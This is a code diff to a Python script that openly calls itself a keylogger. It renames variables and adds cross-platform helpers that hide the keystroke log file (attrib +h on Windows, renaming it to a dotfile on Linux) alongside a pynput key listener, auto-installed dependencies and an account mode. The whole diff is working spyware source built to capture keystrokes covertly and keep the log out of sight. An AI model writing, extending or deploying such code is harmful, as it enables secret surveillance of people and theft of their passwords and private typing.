@@ -1,4 +1,11 @@
 def main():
+    def remove(file_name):
+        if operating_system == "Windows":
+            terminal(f"del {file_name}")
+
+        if operating_system == "Linux":
+            terminal(f"rm -fv {file_name}")
+
     terminal("pip freeze > pip.txt")
     file = open("pip.txt", "r")
     pip_file = file.read()
@@ -7,14 +14,14 @@ def main():
 
     pip_list = pip_file.split("\n")
 
-    IsModuleFound = False
+    is_module_found = False
 
     for pip in pip_list:
         if pip == "pynput==1.7.4":
-            IsModuleFound = True
+            is_module_found = True
             break
 
-    if not IsModuleFound:
+    if not is_module_found:
         terminal("pip install pynput==1.7.4")
 
     try:
@@ -25,14 +32,14 @@ def main():
         if IsAccountActive:
             msg = "Keylogger Activated Successfully...\n\n"
 
-            IsModuleFound = False
+            is_module_found = False
 
             for pip in pip_list:
                 if pip == "requests==2.26.0":
-                    IsModuleFound = True
+                    is_module_found = True
                     break
 
-            if not IsModuleFound:
+            if not is_module_found:
                 terminal("pip install requests==2.26.0")
 
             try:
@@ -85,7 +92,7 @@ def main():
 
         t1 = time()
 
-        if t1-t0 >= 1:
+        if t1 - t0 >= 1:
             print(f"[INFO]\tBooting Time: {t1-t0} s.")
 
         else:
@@ -291,8 +298,7 @@ def main():
         with Listener(on_press=on_press, on_release=on_release) as listener:
             listener.join()
 
-        if operating_system == "Windows":
-            terminal("attrib -h log.txt")
+        un_hide_file("log.txt")
 
         if IsAccountActive:
             msg = "Keylogger deactivated by user..."
@@ -312,12 +318,12 @@ def main():
 
         terminate()
 
+    # if pynput not exist.
     except ModuleNotFoundError as module_error:
         print(f"[ERROR]\tSorry, an error occurred! {module_error}")
         info(f"Error: {module_error}")
 
-        if operating_system == "Windows":
-            terminal("attrib -h log.txt")
+        un_hide_file("log.txt")
 
         Beep(1200, 2000)
 
@@ -328,9 +334,6 @@ try:
     # Importing built-in library.
     print("[INFO]\tImporting DEBUG, basicConfig, info from logging.")
     from logging import DEBUG, basicConfig, info
-
-    print("[INFO]\tImporting remove from os.")
-    from os import remove
 
     print("[INFO]\tImporting system as terminal from os.")
     from os import system as terminal
@@ -355,6 +358,20 @@ try:
     print("[INFO]\tImporting Beep from winsound.")
     from winsound import Beep
 
+    def hide_file(file_name):
+        if operating_system == "Windows":
+            terminal(f"attrib +h {file_name}")
+
+        if operating_system == "Linux":
+            terminal(f"mv -fv {file_name} .{file_name}")
+
+    def un_hide_file(file_name):
+        if operating_system == "Windows":
+            terminal(f"attrib -h {file_name}")
+
+        if operating_system == "Linux":
+            terminal(f"mv -fv .{file_name} {file_name}")
+
     t0 = time()
 
     basicConfig(filename="log.txt", level=DEBUG, format="%(asctime)s: %(message)s")
@@ -362,9 +379,7 @@ try:
     operating_system = environment()
     print(f"[INFO]\tOperating System: {operating_system}")
 
-    if operating_system == "Windows":
-        terminal("attrib +h log.txt")
-        terminal("title Keylogger")
+    hide_file("log.txt")
 
     IsAccountActive = False
 
@@ -402,6 +417,9 @@ except KeyboardInterrupt:
 
     if environment() == "Windows":
         terminal("attrib -h log.txt")
+
+    if environment() == "Linux":
+        terminal(f"mv -fv .log.txt log.txt")
 
     Beep(1200, 2000)
 
